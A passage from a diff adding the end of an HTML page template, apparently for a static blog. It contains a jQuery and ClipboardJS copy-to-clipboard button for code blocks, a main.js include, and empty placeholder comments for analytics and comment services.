+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
